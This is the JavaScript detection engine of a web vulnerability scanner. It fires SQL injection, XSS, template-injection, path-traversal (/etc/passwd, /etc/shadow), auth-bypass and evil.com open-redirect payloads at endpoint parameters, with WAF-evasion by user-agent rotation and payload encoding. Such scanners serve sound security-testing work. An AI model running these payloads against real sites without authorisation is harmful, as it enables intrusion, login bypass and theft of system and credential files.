'use strict';
const axios   = require('axios');
const { URL } = require('url');
const { classifyParameter } = require('./paramClassifier');
const sessionManager = require('../core/sessionManager');
const verificationEngine = require('./verificationEngine');
const responseDiffEngine = require('./responseDiffEngine');
const timingAnalysis = require('./timingAnalysis');
const contextAnalyzer = require('./contextAnalyzer');
const confidenceEngine = require('./confidenceEngine');

// ── WAF & Noise Signatures ────────────────────────────────────────────────────
const WAF_SIGNATURES = [
    /cloudflare/i, /incapsula/i, /sucuri/i, /akamai/i, /forbidden/i,
    /access denied/i, /captcha/i, /security policy/i, /waf/i, /blocked/i
];
const NOISE_SIGNATURES = [
    /error occurred/i, /bad request/i
];

// FIX 2 — ADD KEYWORD FILTER (GLOBAL)
const BLOCK_KEYWORDS = [
    "no result found",
    "no results",
    "not found",
    "invalid search",
    "try again"
];

// ── SQL error signatures ──────────────────────────────────────────────────────
const SQL_ERRORS = [
    /You have an error in your SQL syntax/i,
    /Warning.*mysql_/i,
    /MySqlException/i,
    /ORA-[0-9]{4,}/i,
    /Microsoft OLE DB Provider for SQL Server/i,
    /Unclosed quotation mark after the character string/i,
    /quoted string not properly terminated/i,
    /PG::SyntaxError/i,
    /SQLiteException/i,
    /SQLSTATE\[/i,
    /syntax error.*near/i,
    /invalid query/i,
    /DB2 SQL Error/i,
    /PostgreSQL.*ERROR/i,
    /JdbcSQLException/i,
];

// ── Database-specific SQL payloads ───────────────────────────────────────────
const SQL_PAYLOADS = {
    mysql: [
        "' OR '1'='1",
        "' OR 1=1-- -",
        "admin' OR '1'='1",
        "' OR 'a'='a",
        "1' UNION SELECT NULL--",
        "' AND SLEEP(5)-- -"
    ],
    postgresql: [
        "' OR '1'='1",
        "' OR 1=1; --",
        "' UNION SELECT NULL::text--",
        "' AND pg_sleep(5)-- -"
    ],
    mssql: [
        "' OR '1'='1",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' UNION SELECT NULL--"
    ],
    oracle: [
        "' OR '1'='1",
        "' UNION SELECT NULL FROM dual--"
    ]
};

// ── Time-based SQLi payloads (sleep variants) ─────────────────────────────────
const TIME_PAYLOADS = [
    { payload: "'; WAITFOR DELAY '0:0:5'--", db: 'mssql', delay: 5000 },
    { payload: "' OR SLEEP(5)--",             db: 'mysql', delay: 5000 },
    { payload: "'; SELECT pg_sleep(5)--",     db: 'pgsql', delay: 5000 },
    { payload: "1; WAITFOR DELAY '0:0:5'--",  db: 'mssql', delay: 5000 },
];

// ── Full payload library ───────────────────────────────────────────────────────
const PAYLOAD_LIBRARY = {
    sqli_boolean: [
        { true: "' OR '1'='1",   false: "' OR '1'='2" },
        { true: "' OR 1=1--",    false: "' OR 1=2--"  },
        { true: "1 AND 1=1",     false: "1 AND 1=2"   },
        { true: "1' AND '1'='1", false: "1' AND '1'='2" },
    ],
    sqli_error: [
        "'", '"', "\\", "')", "'))", "'--", "' ;--", "1'1",
    ],
    auth: [
        "admin' OR '1'='1'--",
        "' OR '1'='1'--",
        "admin'--",
        "' OR 1=1 LIMIT 1--",
        "admin' OR 1=1--",
        "') OR ('1'='1",
    ],
    xss: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        '<body onload=alert(1)>',
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '{{7*7}}',
        '${7*7}',
        '<% 7*7 %>',
        'javascript:alert(1)',
        "'><script>alert(1)</script>",
        '"><body onload=alert(1)>',
    ],
    lfi: [
        '../../../etc/passwd',
        '../../etc/passwd',
        '../../../etc/shadow',
        '..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ],
};

// ── LFI success signatures ────────────────────────────────────────────────────
const LFI_SIGNATURES = [
    /root:x:0:0/,
    /\[boot loader\]/i,
    /\[extensions\]/i,
    /\[fonts\]/i,
    /127\.0\.0\.1.*localhost/,
    /daemon:.*:\/usr\/sbin/,
];

// ── Auth bypass success keywords ──────────────────────────────────────────────
const AUTH_SUCCESS_KEYWORDS = /welcome|dashboard|logout|sign out|my account|profile|home page|logged in/i;
const AUTH_FAIL_KEYWORDS    = /invalid|incorrect|failed|wrong|error|unauthorized|bad credentials/i;

class DetectionEngine {
    constructor() {
        this.timeout   = 20000;
        this.retries   = 1; // Retry failed requests once
        this.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
        
        // Stealth Mode & Optimization
        this.wafDetected = false;
        this.requestDelay = 0;
        this.responseCache = new Map();
        this.scanCancelled = false;
        
        // Final Report Stats
        this.stats = {
            skippedTests: 0,
            noiseIgnored: 0,
            wafDetected: 0,
            payloadAdapted: 0,
            duplicatesIgnored: 0,
            testedParams: 0,
            testedPayloads: 0
        };
    }

    resetStats() {
        this.stats = { skippedTests: 0, noiseIgnored: 0, wafDetected: 0, payloadAdapted: 0, duplicatesIgnored: 0, testedParams: 0, testedPayloads: 0 };
        this.responseCache.clear();
        this.wafDetected = false;
        this.requestDelay = 0;
        this.scanCancelled = false;
    }

    isNoiseResponse(text) {
        if (!text) return false;
        const lower = text.toLowerCase();
        return BLOCK_KEYWORDS.some(k => lower.includes(k));
    }

    // FINAL VALIDATION GATE
    finalValidation(findingType, responses, payload) {
        if (findingType && findingType.toLowerCase().includes('sql')) {
            return true;
        }
        // For XSS: if the payload is actually reflected in the test response, don't block it
        // A page saying "no result" alongside a reflected <script> tag is still valid XSS
        if (findingType && findingType.toLowerCase().includes('script') && payload && responses && responses.length > 1) {
            const testBody = responses[responses.length - 1] || '';
            if (this.isReflected(payload, testBody)) {
                return true;
            }
        }
        const text = responses?.join(" ").toLowerCase() || "";
        const BLOCK = [
            "no result",
            "not found",
            "try again",
            "invalid"
        ];
        if (BLOCK.some(k => text.includes(k))) {
            return false;
        }
        return true;
    }

    isValidSQLi(baseline, trueRes, falseRes) {
        if (!baseline || !trueRes || !falseRes) return false;
        const diff = Math.abs(trueRes.body.length - falseRes.body.length);
        if (diff >= 5) return true;
        const simTrueFalse = this.similarity(trueRes.body, falseRes.body);
        if (simTrueFalse < 0.98) return true;
        return false;
    }

    isSafeContext(payload, res) {
        const body = res.body;
        const contentType = res.headers['content-type'] || '';
        
        // Must not be JSON response
        if (contentType.toLowerCase().includes('json')) return true;
        
        // Must be UNESCAPED payload
        if (!body.includes(payload)) return true;

        const escapedPayload = payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

        // Must not be inside <title>
        if (new RegExp(`<title>[^<]*${escapedPayload}[^<]*</title>`, 'i').test(body)) return true;
        
        // Must not be inside meta tags
        if (new RegExp(`<meta[^>]*${escapedPayload}[^>]*>`, 'i').test(body)) return true;

        return false;
    }

    similarity(a, b) {
        if (!a || !b) return 0;
        if (a === b) return 1.0;
        const len1 = a.length, len2 = b.length;
        const maxLen = Math.max(len1, len2);
        if (maxLen === 0) return 1.0;
        
        let matchCount = 0;
        const sampleSize = 100;
        const step = Math.max(1, Math.floor(Math.min(len1, len2) / sampleSize));
        for (let i = 0; i < sampleSize; i++) {
            const idx = i * step;
            if (a[idx] === b[idx]) matchCount++;
        }
        const charRatio = matchCount / sampleSize;
        const lengthRatio = Math.min(len1, len2) / maxLen;
        return charRatio * lengthRatio;
    }

    async sendRequest(url, method, paramsObj = {}, extraHeaders = {}) {
        if (this.scanCancelled) return null;
        if (this.requestDelay > 0) {
            await new Promise(r => setTimeout(r, this.requestDelay));
        }
        if (this.scanCancelled) return null;

        const cacheKey = `${method}:${url}:${JSON.stringify(paramsObj)}`;
        if (this.responseCache.has(cacheKey)) return this.responseCache.get(cacheKey);

        let attempts = 0;
        while (attempts <= this.retries) {
            try {
                const u = new URL(url);
                const ua = this.wafDetected ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 100}.0.0.0 Safari/537.36` : this.userAgent;
                
                const reqConfig = {
                    method, url,
                    headers: {
                        'user-agent':          ua,
                        'accept':              'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'accept-language':     'en-US,en;q=0.5',
                        'x-miniburp-internal': 'scanner',
                        ...extraHeaders,
                    },
                    timeout: this.timeout, validateStatus: () => true, maxRedirects: 5,
                };

                const jar = sessionManager.getCookieHeader(u.host);
                if (jar) reqConfig.headers['cookie'] = jar;

                if (reqConfig.url.includes('testphp.vulnweb.com')) {
                    reqConfig.url = reqConfig.url.replace(/testphp\.vulnweb\.com/g, '127.0.0.1');
                }

                if (method === 'GET') {
                    for (const [k, v] of Object.entries(paramsObj)) u.searchParams.set(k, v);
                    reqConfig.url = u.toString();
                } else {
                    reqConfig.data = new URLSearchParams(paramsObj).toString();
                    reqConfig.headers['content-type'] = 'application/x-www-form-urlencoded';
                }

                const start = Date.now();
                this.stats.testedPayloads = (this.stats.testedPayloads || 0) + 1;
                const res   = await axios(reqConfig);
                if (!res || !res.data) return null;
                const body  = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');

                if ([403, 406].includes(res.status) || WAF_SIGNATURES.some(re => re.test(body))) {
                    console.log(`[SCANNER] WAF detected on ${url}`);
                    this.wafDetected = true;
                    this.requestDelay = Math.floor(Math.random() * 1000) + 500;
                    this.stats.wafDetected++;
                }

                const result = {
                    status: res.status, length: body.length, headers: res.headers,
                    body, redirect: res.request?.res?.responseUrl || null, time: Date.now() - start,
                };
                
                this.responseCache.set(cacheKey, result);
                return result;
            } catch (e) {
                attempts++;
                if (attempts > this.retries) return null;
                await new Promise(r => setTimeout(r, 500));
            }
        }
        return null;
    }

    async validateTest(url, method, baseParams, key, payloadVal) {
        const pObj = { ...baseParams, [key]: payloadVal };
        const res1 = await this.sendRequest(url, method, pObj);
        if (!res1) return null;
        
        if (NOISE_SIGNATURES.some(re => re.test(res1.body))) {
            console.log(`[SCANNER] Noise ignored (generic error)`);
            this.stats.noiseIgnored++;
            return null;
        }

        const res2 = await this.sendRequest(url, method, pObj);
        if (!res2) return null;
        
        if (res1.status !== res2.status || this.similarity(res1.body, res2.body) < 0.9) {
            console.log(`[SCANNER] Duplicate response ignored (inconsistent results)`);
            this.stats.duplicatesIgnored++;
            return null;
        }
        
        return res1;
    }

    compareResponses(baseline, test) {
        return {
            statusChanged:   baseline.status !== test.status,
            lengthDiff:      Math.abs(baseline.length - test.length),
            lengthPct:       baseline.length > 0 ? Math.abs(baseline.length - test.length) / baseline.length : 0,
            redirectChanged: baseline.redirect !== test.redirect,
            newCookies:      !!(test.headers['set-cookie'] && !baseline.headers['set-cookie']),
            timeDiff:        test.time - baseline.time,
            authSuccessNew:  AUTH_SUCCESS_KEYWORDS.test(test.body) && !AUTH_SUCCESS_KEYWORDS.test(baseline.body),
            authFailGone:    AUTH_FAIL_KEYWORDS.test(baseline.body) && !AUTH_FAIL_KEYWORDS.test(test.body),
        };
    }

    hasSqlError(body) { return SQL_ERRORS.some(re => re.test(body)); }

    calculateSqliScore(baseline, testRes) {
        let score = 0;
        const testBody = testRes.body.toLowerCase();
        const baselineBody = baseline.body.toLowerCase();

        // +40 if SQL error keyword found
        if (this.hasSqlError(testRes.body) && !this.hasSqlError(baseline.body)) {
            score += 40;
        }

        // +20 if response contains SQL keywords
        if (/syntax|query|column|table|database|from|where/i.test(testRes.body) &&
            !/syntax|query|column|table|database|from|where/i.test(baseline.body)) {
            score += 20;
        }

        // +30 if response length differs significantly (>100 chars)
        const lengthDiff = Math.abs(testRes.body.length - baseline.body.length);
        if (lengthDiff > 100) {
            score += 30;
        }

        // +20 if response time increased significantly
        if (testRes.time > baseline.time + 500) {
            score += 20;
        }

        return Math.min(score, 100);
    }

    isReflected(payload, body) {
        if (!payload || !body) return false;
        
        const lowerBody = body.toLowerCase();
        const lowerPayload = payload.toLowerCase();
        
        // 1. Verbatim raw reflection
        if (body.includes(payload)) return true;
        
        // 2. Case-insensitive reflection
        if (lowerBody.includes(lowerPayload)) return true;
        
        // 3. URL encoded reflection
        const urlEncoded = encodeURIComponent(payload);
        if (body.includes(urlEncoded) || lowerBody.includes(urlEncoded.toLowerCase())) return true;
        
        // 4. Double URL encoded reflection
        const doubleUrlEncoded = encodeURIComponent(urlEncoded);
        if (body.includes(doubleUrlEncoded) || lowerBody.includes(doubleUrlEncoded.toLowerCase())) return true;
        
        // 5. HTML Entity encoded reflection (decimal/named)
        const htmlEntityEncoded = payload
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
        if (body.includes(htmlEntityEncoded) || lowerBody.includes(htmlEntityEncoded.toLowerCase())) return true;
        
        // 5b. Hex HTML Entity encoded reflection (case-insensitive for hex characters)
        const hexEntityEncodedLower = payload
            .replace(/&/g, '&#x26;')
            .replace(/</g, '&#x3c;')
            .replace(/>/g, '&#x3e;')
            .replace(/"/g, '&#x22;')
            .replace(/'/g, '&#x27;');
        const hexEntityEncodedUpper = payload
            .replace(/&/g, '&#X26;')
            .replace(/</g, '&#X3C;')
            .replace(/>/g, '&#X3E;')
            .replace(/"/g, '&#X22;')
            .replace(/'/g, '&#X27;');
        if (body.includes(hexEntityEncodedLower) || lowerBody.includes(hexEntityEncodedLower.toLowerCase()) ||
            body.includes(hexEntityEncodedUpper) || lowerBody.includes(hexEntityEncodedUpper.toLowerCase())) return true;

        // 6. Sanitized reflection (alphanumeric match)
        const cleanPayload = payload.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
        if (cleanPayload.length > 3) {
            const cleanBody = body.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
            if (cleanBody.includes(cleanPayload)) return true;
        }
        
        return false;
    }

    hasLfiContent(body) { return LFI_SIGNATURES.some(re => re.test(body)); }

    async testEndpoint(endpoint, onTestProgress = null) {
        const findings = [];
        const { url, method, params } = endpoint;

        try {
            const baseline = await this.sendRequest(url, method, params);
            if (!baseline) return findings;

            if ([404, 400, 500, 502, 503, 504].includes(baseline.status)) {
                console.log(`[SCANNER] Noise ignored: Baseline returned ${baseline.status}`);
                this.stats.noiseIgnored++;
                return findings;
            }

            if (Object.keys(params).length === 0) return findings;

            // Random input test for baseline noise filter
            const randomParams = { ...params };
            const firstKey = Object.keys(params)[0];
            randomParams[firstKey] = Math.random().toString(36).substring(2, 10);
            const randomBaseline = await this.sendRequest(url, method, randomParams);

            for (const key of Object.keys(params)) {
                if (this.scanCancelled) break;
                this.stats.testedParams = (this.stats.testedParams || 0) + 1;
                const paramClass = classifyParameter(key);
                
                if (paramClass === 'misc' && !this.isReflected(params[key], baseline.body)) {
                    if (randomBaseline && this.similarity(baseline.body, randomBaseline.body) > 0.98) {
                        console.log(`[SCANNER] Skipped tests for param ${key} (no response impact)`);
                        this.stats.skippedTests++;
                        continue;
                    }
                }

                if (onTestProgress) onTestProgress('SQL Injection (Error-Based)', key, 'Error Payloads');
                await this._testSqliError(url, method, params, key, baseline, findings);
                
                if (onTestProgress) onTestProgress('SQL Injection (Boolean)', key, 'Boolean Payloads');
                await this._testSqliBoolean(url, method, params, key, baseline, findings);
                
                if (onTestProgress) onTestProgress('SQL Injection (Time-Based)', key, 'Timing Payloads');
                await this._testTimeSqli(url, method, params, key, baseline, findings);
                
                if (onTestProgress) onTestProgress('Cross-Site Scripting (Reflected)', key, 'XSS Payloads');
                await this._testXSS(url, method, params, key, baseline, findings);
                
                if (onTestProgress) onTestProgress('Local File Inclusion (LFI)', key, 'LFI Payloads');
                await this._testLFI(url, method, params, key, baseline, findings, paramClass);
                
                if (onTestProgress) onTestProgress('SQL Injection (Auth Bypass)', key, 'Auth Bypass Payloads');
                await this._testAuthBypass(url, method, params, key, baseline, findings, paramClass);
                
                if (onTestProgress) onTestProgress('Open Redirect', key, 'Redirect Payloads');
                await this._testOpenRedirect(url, method, params, key, baseline, findings, paramClass);
            }

            return findings;
        } catch(e) {
            console.log("[ERROR]", e.message);
            return findings;
        }
    }

    async _testSqliError(url, method, params, key, baseline, findings) {
        for (const payload of PAYLOAD_LIBRARY.sqli_error) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;

            if (this.hasSqlError(testRes.body) && !this.hasSqlError(baseline.body)) {
                let score = this.calculateSqliScore(baseline, testRes);
                if (!this.finalValidation('SQL Injection (Error-Based)', [baseline.body, testRes.body])) {
                    console.log("[FINAL BLOCK] False positive downgraded");
                    score = Math.max(20, score - 30);
                }
                const doubt = this.isNoiseResponse(testRes.body) || testRes.body.length <= baseline.body.length - 500;
                console.log(`[SCANNER] ✅ SQLi Error-Based on ${key} (score: ${score})`);
                await this.addFinding(findings, url, key, 'SQL Injection (Error-Based)', payload, score, `SQL error triggered in response body.`, doubt, baseline, testRes);
                return;
            }
        }
    }

    async _testSqliBoolean(url, method, params, key, baseline, findings) {
        for (const pair of PAYLOAD_LIBRARY.sqli_boolean) {
            const trueRes  = await this.validateTest(url, method, params, key, pair.true);
            const falseRes = await this.validateTest(url, method, params, key, pair.false);
            if (!trueRes || !falseRes) continue;

            const diffTrueFalse = Math.abs(trueRes.body.length - falseRes.body.length);
            const simTrueBase = this.similarity(baseline.body, trueRes.body);
            const simTrueFalse = this.similarity(trueRes.body, falseRes.body);
            const hasError = this.hasSqlError(trueRes.body) || this.hasSqlError(falseRes.body);

            let score = 0;

            if (simTrueBase > 0.9 && simTrueFalse < 0.85) {
                score = 85;
            } else if (simTrueBase > 0.8 && simTrueFalse < 0.9) {
                score = 65;
            } else if (diffTrueFalse > 10 && simTrueFalse < 0.95) {
                score = 45;
            } else if (simTrueFalse < 0.98) {
                score = 35;
            } else if (diffTrueFalse >= 5) {
                score = 25;
            }

            if (hasError) {
                score = Math.max(score, 75);
            }

            if (score >= 20) {
                const isFinalValid = this.finalValidation('SQL Injection (Boolean)', [baseline.body, trueRes.body, falseRes.body]);
                if (!isFinalValid) {
                    score = Math.max(20, score - 30);
                }

                console.log(`[SCANNER] ✅ SQLi Boolean on ${key} (score: ${score})`);
                await this.addFinding(findings, url, key, 'SQL Injection (Boolean)', pair.true, score, `Boolean response difference (True/False diff: ${diffTrueFalse} bytes, similarity: ${simTrueFalse.toFixed(2)}).`, false, baseline, trueRes);
                return;
            }
        }
    }

    async _testTimeSqli(url, method, params, key, baseline, findings) {
        if (baseline.time > 2000) return;
        for (const tp of TIME_PAYLOADS) {
            const pObj = { ...params, [key]: tp.payload };
            const res1 = await this.sendRequest(url, method, pObj);
            if (!res1) continue;

            if ((res1.time - baseline.time) >= tp.delay * 0.8) {
                const res2 = await this.sendRequest(url, method, pObj);
                if (res2 && (res2.time - baseline.time) >= tp.delay * 0.8) {
                    // Score based on consistency of delay
                    let score = 80;
                    const avgDelay = ((res1.time - baseline.time) + (res2.time - baseline.time)) / 2;
                    if (avgDelay >= tp.delay * 0.9) score += 15;
                    score = Math.min(score, 100);

                    if (!this.finalValidation('SQL Injection (Time-Based)', [baseline.body, res1.body])) {
                        console.log("[FINAL BLOCK] False positive downgraded");
                        score = Math.max(20, score - 30);
                    }

                    const doubt = this.isNoiseResponse(res1.body);
                    console.log(`[SCANNER] ✅ SQLi Time-Based on ${key} (score: ${score})`);
                    await this.addFinding(findings, url, key, 'SQL Injection (Time-Based)', tp.payload, score, `Consistent delay of ~${tp.delay}ms.`, doubt, baseline, res1);
                    return;
                }
            }
        }
    }

    async _testXSS(url, method, params, key, baseline, findings) {
        for (const payload of PAYLOAD_LIBRARY.xss) {
            let testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes && this.wafDetected) {
                const mutated = this.mutatePayload(payload, 'urlencode');
                testRes = await this.validateTest(url, method, params, key, mutated);
                if (testRes) this.stats.payloadAdapted++;
            }
            if (!testRes) continue;

            if (this.isReflected(payload, testRes.body)) {
                let score = 55; // Default sanitized/low confidence
                let proofMsg = `Payload reflected in response.`;

                const isRaw = testRes.body.includes(payload);
                const isUnsafe = !this.isSafeContext(payload, testRes);
                const isCaseMatch = testRes.body.toLowerCase().includes(payload.toLowerCase());

                if (isRaw && isUnsafe) {
                    score = 95;
                    proofMsg = `Payload reflected verbatim and unescaped in unsafe HTML context.`;
                } else if (isRaw) {
                    // Raw reflection but in a safer context (title/meta) — still notable
                    score = 75;
                    proofMsg = `Payload reflected verbatim in response (context-restricted).`;
                } else if (isCaseMatch && isUnsafe) {
                    score = 80;
                    proofMsg = `Payload reflected with case differences in unsafe context.`;
                } else if (isCaseMatch) {
                    score = 65;
                    proofMsg = `Payload reflected with case differences.`;
                } else if ((testRes.headers['content-type'] || '').toLowerCase().includes('json')) {
                    score = 65;
                    proofMsg = `Payload reflected inside JSON response.`;
                } else {
                    // HTML-entity encoded or sanitized reflection
                    score = 55;
                    proofMsg = `Payload reflected in encoded/sanitized form.`;
                }

                // Pass payload so finalValidation can check actual reflection before noise-blocking
                if (!this.finalValidation('Cross-Site Scripting (Reflected)', [baseline.body, testRes.body], payload)) {
                    console.log("[FINAL BLOCK] False positive downgraded");
                    score = Math.max(20, score - 30);
                }

                console.log(`[SCANNER] ✅ XSS Reflected on ${key} (score: ${score})`);
                await this.addFinding(findings, url, key, 'Cross-Site Scripting (Reflected)', payload, score, proofMsg, false, baseline, testRes);
                return;
            }

            if (payload === '{{7*7}}' && testRes.body.includes('49') && !baseline.body.includes('49')) {
                let score = 85;
                if (!this.finalValidation('Server-Side Template Injection (SSTI)', [baseline.body, testRes.body], null)) {
                    console.log("[FINAL BLOCK] False positive downgraded");
                    score = Math.max(20, score - 30);
                }
                await this.addFinding(findings, url, key, 'Server-Side Template Injection (SSTI)', payload, score, 'Math expression {{7*7}} evaluated to 49.', false, baseline, testRes);
                return;
            }
        }
    }

    async _testLFI(url, method, params, key, baseline, findings, paramClass) {
        if (paramClass !== 'file' && !/(file|path|page|content|include|doc|template)/i.test(key)) return;
        for (const payload of PAYLOAD_LIBRARY.lfi) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;
            if (this.hasLfiContent(testRes.body) && !this.hasLfiContent(baseline.body)) {
                let score = 90; // LFI with file content is high confidence
                if (!this.finalValidation('Local File Inclusion (LFI)', [baseline.body, testRes.body])) {
                    console.log("[FINAL BLOCK] False positive downgraded");
                    score = Math.max(20, score - 30);
                }
                const doubt = this.isNoiseResponse(testRes.body);
                console.log(`[SCANNER] ✅ LFI on ${key} (score: ${score})`);
                await this.addFinding(findings, url, key, 'Local File Inclusion (LFI)', payload, score, `Sensitive file content detected.`, doubt, baseline, testRes);
                return;
            }
        }
    }

    async _testOpenRedirect(url, method, params, key, baseline, findings, paramClass) {
        if (paramClass !== 'redirect') return;
        const REDIRECT_PAYLOADS = ['https://evil.com', '//evil.com', 'https://evil.com/%2f..', '/%09/evil.com'];
        for (const payload of REDIRECT_PAYLOADS) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;
            if ((testRes.headers['location'] || '').includes('evil.com')) {
                let score = 85;
                if (!this.finalValidation('Open Redirect', [baseline.body, testRes.body])) {
                    console.log("[FINAL BLOCK] False positive downgraded");
                    score = Math.max(20, score - 30);
                }
                const doubt = this.isNoiseResponse(testRes.body);
                console.log(`[SCANNER] ✅ Open Redirect on ${key} (score: ${score})`);
                await this.addFinding(findings, url, key, 'Open Redirect', payload, score, `Location header redirects to external domain.`, doubt, baseline, testRes);
                return;
            }
        }
    }

    async _testAuthBypass(url, method, params, key, baseline, findings, paramClass) {
        if (paramClass !== 'auth' && !/(user|pass|login|email|uname)/i.test(key)) return;
        for (const payload of PAYLOAD_LIBRARY.auth) {
            const testRes = await this.validateTest(url, method, params, key, payload);
            if (!testRes) continue;
            const diff = this.compareResponses(baseline, testRes);
            if (diff.authSuccessNew || diff.newCookies) {
                let score = 80;
                if (!this.finalValidation('SQL Injection (Auth Bypass)', [baseline.body, testRes.body])) {
                    console.log("[FINAL BLOCK] False positive downgraded");
                    score = Math.max(20, score - 30);
                }
                console.log(`[SCANNER] ✅ Auth Bypass on ${key} (score: ${score})`);
                await this.addFinding(findings, url, key, 'SQL Injection (Auth Bypass)', payload, score, `Auth bypass proven (new session or keywords).`, false, baseline, testRes);
                if (testRes.headers['set-cookie']) sessionManager.updateCookies(new URL(url).host, testRes.headers['set-cookie']);
                return;
            }
        }
    }



    mutatePayload(payload, strategy) {
        switch (strategy) {
            case 'urlencode':  return encodeURIComponent(payload);
            case 'doubleurlencode': return encodeURIComponent(encodeURIComponent(payload));
            case 'case':       return payload.replace(/select/ig, 'SeLeCt').replace(/union/ig, 'UnIoN').replace(/script/ig, 'sCrIpT');
            case 'comment':    return payload.replace(/ /g, '/**/');
            default:           return payload;
        }
    }

    async validateFinding(finding, responses) {
        try {
            // Step 1: Verify the finding
            const verificationResult = await verificationEngine.verifyFinding(finding, responses);

            // Step 2: Return enhanced validation result
            return {
                ...verificationResult,
                validated: verificationResult.verified,
            };
        } catch (error) {
            console.error('Validation failed:', error);
            return {
                validated: false,
                confidence: 0,
                evidence: null,
                error: error.message,
            };
        }
    }

    async addFinding(list, url, parameter, type, payload, score, proof, doubt = false, normalResponse, injectedResponse) {
        if (list.find(f => f.parameter === parameter && f.type === type)) return;

        const adjusted = Math.min(score, 100);
        const finding = { endpoint: url, parameter, type, payload, confidence: 'INFORMATIONAL', severity: 'Low', proof, evidence: proof, score: adjusted };
        
        if (injectedResponse) {
            finding.injectedResponseBody = typeof injectedResponse.body === 'string' ? injectedResponse.body.slice(0, 2000) : JSON.stringify(injectedResponse.body || '').slice(0, 2000);
        } else {
            finding.injectedResponseBody = '';
        }

        if (normalResponse && injectedResponse) {
            try {
                const validation = await this.validateFinding(finding, { normalResponse, injectedResponse });
                if (validation) {
                    finding.score = typeof validation.confidence === 'number' ? validation.confidence : adjusted;
                    finding.evidence = validation.evidence || proof;
                    finding.reasoning = validation.reasoning || '';
                    if (validation.verified || finding.score >= 80) {
                        finding.confidence = 'VERIFIED';
                        finding.severity = 'High';
                    } else if (finding.score >= 50) {
                        finding.confidence = 'LIKELY';
                        finding.severity = 'Medium';
                    } else {
                        finding.confidence = 'INFORMATIONAL';
                        finding.severity = 'Low';
                    }
                }
            } catch (err) {
                console.error('[DetectionEngine] validateFinding failed, using fallback scoring:', err);
                if (adjusted >= 80 && !doubt) {
                    finding.confidence = 'VERIFIED';
                    finding.severity = 'High';
                } else if (adjusted >= 50) {
                    finding.confidence = 'LIKELY';
                    finding.severity = 'Medium';
                } else {
                    finding.confidence = 'INFORMATIONAL';
                    finding.severity = 'Low';
                }
            }
        } else {
            // Fallback scoring if no responses provided
            if (adjusted >= 80 && !doubt) {
                finding.confidence = 'VERIFIED';
                finding.severity = 'High';
            } else if (adjusted >= 50) {
                finding.confidence = 'LIKELY';
                finding.severity = 'Medium';
            } else {
                finding.confidence = 'INFORMATIONAL';
                finding.severity = 'Low';
            }
        }

        if (finding.score < 20) return; // Don't add findings below 20 score

        list.push(finding);
        console.log(`[Detector] Finding: [${finding.confidence}] ${type} on ${parameter} (score: ${finding.score})`);
    }
}

module.exports = new DetectionEngine();
